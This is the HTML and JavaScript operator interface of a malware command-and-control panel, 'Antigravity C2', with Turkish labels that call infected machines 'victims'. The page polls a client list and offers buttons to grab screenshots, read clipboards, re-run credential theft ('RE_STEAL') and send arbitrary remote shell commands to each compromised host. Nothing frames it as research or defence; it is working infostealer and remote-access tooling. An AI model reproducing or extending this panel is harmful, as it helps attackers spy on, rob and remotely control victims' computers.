<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Antigravity C2 Panel</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
        .container { max-width: 1000px; margin: auto; }
        header { border-bottom: 2px solid #1e293b; padding-bottom: 20px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; }
        h1 { margin: 0; color: #38bdf8; }
        .client-card { background: #1e293b; border-radius: 12px; padding: 20px; margin-bottom: 15px; border: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
        .client-card:hover { border-color: #38bdf8; }
        .client-info b { color: #38bdf8; }
        .status-online { color: #4ade80; font-size: 0.8em; }
        .status-offline { color: #fb7185; font-size: 0.8em; }
        .btn-group { display: flex; gap: 10px; }
        button { background: #0369a1; color: white; border: none; padding: 8px 15px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; }
        button:hover { background: #0ea5e9; }
        button.danger { background: #be123c; }
        button.danger:hover { background: #e11d48; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🛡️ Antigravity C2 Terminal</h1>
            <div id="stats">Checking connections...</div>
        </header>

        <div id="client-list">
            <!-- JavaScript ile dolacak -->
        </div>
    </div>

    <script>
        async function fetchClients() {
            try {
                const response = await fetch('/api/clients');
                const clients = await response.json();
                const listDiv = document.getElementById('client-list');
                const statsDiv = document.getElementById('stats');
                
                let html = '';
                let onlineCount = 0;

                for (const [hwid, data] of Object.entries(clients)) {
                    if (data.status === 'online') onlineCount++;
                    html += `
                        <div class="client-card">
                            <div class="client-info">
                                <div><b>HWID:</b> ${hwid}</div>
                                <div><b>IP:</b> ${data.ip} | <b>OS:</b> ${data.os}</div>
                                <div class="${data.status === 'online' ? 'status-online' : 'status-offline'}">
                                    ● ${data.status.toUpperCase()}
                                </div>
                            </div>
                            <div class="btn-group">
                                <button onclick="sendCommand('${hwid}', 'GET_SS')">📸 Get SS</button>
                                <button onclick="sendCommand('${hwid}', 'GET_CLIP')">📋 Clipboard</button>
                                <button onclick="sendCommand('${hwid}', 'RE_STEAL')">🔁 Re-Steal</button>
                                <button class="danger" onclick="sendShell('${hwid}')">🐚 Shell</button>
                            </div>
                        </div>
                    `;
                }
                listDiv.innerHTML = html || '<p style="text-align:center; opacity:0.5;">Henüz bağlı kurban yok...</p>';
                statsDiv.innerHTML = `Connected: ${onlineCount} active clients`;
            } catch (e) {
                console.error("Fetch error:", e);
            }
        }

        async function sendCommand(hwid, cmd) {
            await fetch(`/api/command/${hwid}/${cmd}`, { method: 'POST' });
            alert(`Komut Gönderildi: ${cmd}`);
        }

        async function sendShell(hwid) {
            const cmd = prompt("Çalıştırılacak Shell Komutu:");
            if (cmd) {
                await fetch(`/api/command/${hwid}/SHELL:${cmd}`, { method: 'POST' });
                alert("Shell komutu sıraya alındı.");
            }
        }

        setInterval(fetchClients, 5000);
        fetchClients();
    </script>
</body>
</html>
